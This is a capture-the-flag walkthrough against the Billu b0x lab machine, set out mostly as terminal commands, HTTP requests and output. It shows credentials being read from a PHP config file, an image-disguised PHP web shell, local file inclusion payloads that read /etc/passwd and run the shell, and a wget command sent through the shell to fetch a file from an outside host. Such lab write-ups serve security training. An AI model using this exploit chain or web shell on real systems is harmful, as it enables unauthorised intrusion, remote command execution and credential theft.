root@Blue3:/media/Linux-Storage/[Github]/eblue3# curl -X POST --data "file=c.php" http://Billu-b0x.ctf/test.php
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>

=> We got the credential: billy / b0x_billu for MySQL. Let's check on phpMyAdmin
=> We got the access
=> MySQL: localhost - ica_lab - auth: if we enable full "Options":
Full texts 	id 	uname 	pass
1 	biLLu 	hEx_it
=> MySQL: localhost - ica_lab - users:
1 	Jack 	jack.jpg 	Jack sparrow, Pirate of the caribbean
2 	Captain Barbossa 	CaptBarbossa.JPG 	Captain Barbossa, pirate of the caribbean
=> 2 users: Jack & Captain Barbossa

OK. So let's try biLLu / hEx_it in the homepage (credentials from MySQL for login form)
=> Got it.
=> There's panel.php with 2 function: show & add
=> so let's check panel.php again:

...
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);

	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}
        if($choice==='show')
	{
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
}
if(isset($_POST['upload']))
{
	$name=mysqli_real_escape_string($conn,$_POST['name']);
	$address=mysqli_real_escape_string($conn,$_POST['address']);
	$id=mysqli_real_escape_string($conn,$_POST['id']);

	if(!empty($_FILES['image']['name']))
	{
		$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
	$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
	$image=array('jpeg','jpg','gif','png');
	if(in_array($r,$image))
	{
		$finfo = @new finfo(FILEINFO_MIME);
	$filetype = @$finfo->file($_FILES['image']['tmp_name']);
		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
				{
					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
							 {
							  echo "Uploaded successfully ";
							  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')';
							 mysqli_query($conn, $update);
							}
				}
			else
			{
				echo "<br>i told you dear, only png,jpg and gif file are allowed";
			}
	}
	else
	{
		echo "<br>only png,jpg and gif file are allowed";
	}
}
}
?>

=> Create a malicious image and upload it to the server to check if the server runs it or not:
root@Blue3:/media/Linux-Storage/[Github]/eblue3# echo 'FFD8FFEo' | xxd -r -p > my_image.gif
root@Blue3:/media/Linux-Storage/[Github]/eblue3# echo '<?php phpinfo(); ?>' >> my_image.gif
root@Blue3:/media/Linux-Storage/[Github]/eblue3# cat my_image.gif
���<?php phpinfo(); ?>

"The image “http://billu-b0x.ctf/uploaded_images/my_image.gif” cannot be displayed because it contains errors."
=> Using Burp Suite to intercept and forward with new crafted payload:
LFI-1.png:
load=../../../../../../../etc/passwd&continue=continue
LFI-2.png:
load=/uploaded_images/my_image.gif&continue=continue

Nicely done. Now is the shell:
root@Blue3:~# echo 'FFD8FFEo' | xxd -r -p > shell.gif
root@Blue3:~# echo '<?php passthru($_GET['cmd']); ?>' >> shell.gif
root@Blue3:~# cat shell.gif
���<?php passthru($_GET[cmd]); ?>

LFI-3.png:
"POST /panel.php?cmd=whoami HTTP/1.1
...
load=/uploaded_images/shell.gif&continue=continue"
=> ���www-data
=> OK now i have the cmd now and can check many things with panel.php?cmd=<command>

=> I can do any www-data priv commands to victim:
"POST /panel.php?cmd=/usr/bin/wget+http://<URI>+-O+/tmp/<output_file> HTTP/1.1
...
load=/uploaded_images/shell.gif&continue=continue"

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#
